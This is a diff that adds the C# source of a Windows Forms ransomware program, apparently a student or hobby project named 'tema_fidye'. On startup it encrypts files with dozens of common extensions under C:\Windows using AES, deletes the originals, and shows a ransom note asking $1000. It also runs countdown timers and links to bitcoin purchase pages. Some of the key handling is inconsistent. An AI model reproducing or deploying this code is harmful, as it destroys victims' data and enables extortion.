@@ -1,0 +1,163 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Security.Cryptography;
+using System.Net.Http;
+using System.Net;
+using System.Net.Mail;
+using Microsoft.Win32;
+using System.Runtime.Remoting.Contexts;
+using System.Runtime.Remoting.Lifetime;
+
+
+
+namespace tema_fidye
+{
+    
+    
+    public partial class Form1 : Form
+    {
+        private const string EncryptionKey = "QGVzdGFydCBLZXkgQ29kZToga1VtMWhhbTdXaHc0aSE="; // Şifreleme anahtarınızı buraya girin
+        public Form1()
+        {
+            InitializeComponent();
+            EncryptFiles();
+        }
+        int seconds3 = 172800;
+        int seconds7 = 345600;
+
+        private void Form1_Load(object sender, EventArgs e)
+
+
+        {
+            timer1.Interval = 1000;
+            timer1.Enabled = true;
+
+
+            {
+
+
+
+
+            }
+
+        }
+
+        private void EncryptFiles()
+        {
+            string[] fileExtensions = { ".zip", ".jpg", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".mdb", ".mdbx",
+                                        ".avi", ".mp4", ".mkv", ".wmv", ".flv", ".3gp", ".dat", ".mov", ".ogg", ".mp3",
+                                        ".wav", ".mid", ".jpeg", ".png", ".bmp", ".psd", ".gif", ".pdf", ".exe", ".rar",
+                                        ".zip", ".tar", ".7z", ".txt", ".odt", ".ott", ".rtf", ".uot", ".dic", ".html",
+                                        ".php", ".aspx", ".asp" };
+
+            string sourceFolder = @"C:\Windows"; // Şifrelemek istediğiniz dosyaların kaynak klasörünü buraya girin
+
+            if (!Directory.Exists(sourceFolder))
+            {
+
+                return;
+            }
+
+            foreach (string fileExtension in fileExtensions)
+            {
+                string[] files = Directory.GetFiles(sourceFolder, "*" + fileExtension);
+
+                foreach (string filePath in files)
+                {
+                    string encryptedFilePath = Path.ChangeExtension(filePath, ".encrypted");
+                    string key = GenerateRandomKey();
+
+                    EncryptFile(filePath, encryptedFilePath, key);
+                    File.Delete(filePath);
+                }
+            }
+
+            MessageBox.Show("The files were encrypted and the original files were deleted. buy key $1000");
+        }
+
+        private void EncryptFile(string inputFile, string outputFile, string key)
+        {
+            using (Aes aes = Aes.Create())
+            {
+                aes.KeySize = 192;
+                aes.Key = Convert.FromBase64String(EncryptionKey);
+                aes.GenerateIV();
+
+                using (FileStream inputStream = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
+                using (FileStream outputStream = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
+                using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
+                {
+                    byte[] buffer = new byte[1024];
+                    int bytesRead;
+
+                    while ((bytesRead = inputStream.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        cryptoStream.Write(buffer, 0, bytesRead);
+                    }
+                }
+
+                // Şifreleme anahtarını kaydetme
+                string keyFilePath = Path.ChangeExtension(outputFile, ".key");
+                File.WriteAllText(keyFilePath, key);
+            }
+        }
+
+        private string GenerateRandomKey()
+        {
+            using (Aes aes = Aes.Create())
+            {
+                aes.KeySize = 192;
+                aes.GenerateKey();
+                return Convert.ToBase64String(aes.Key);
+            }
+        }
+        //label 10 boş
+        private void label10_Click(object sender, EventArgs e)
+        {
+            
+        }
+       
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            DateTime dt = DateTime.Now;
+            label10.Text = dt.ToString("MM/dd/yyyy HH:mm:ss");
+            label12.Text = dt.ToString("MM/dd/yyyy HH:mm:ss");
+
+            seconds3--;
+            label11.Text = new DateTime(1970, 01, 01, 00, 00, 00).AddSeconds(seconds3).ToString("dd:HH:mm:ss");
+            seconds7--;
+            label13.Text = new DateTime(1970, 01, 01, 00, 00, 00).AddSeconds(seconds7).ToString("dd:HH:mm:ss");
+
+
+
+        }
+        //text boox1 boş
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+      
+
+        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            Process.Start("https://bitcoin.org/en/");
+        }
+
+        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+            Process.Start("https://bitcoin.org/en/exchanges");
+        }
+
+      
+    }
+}
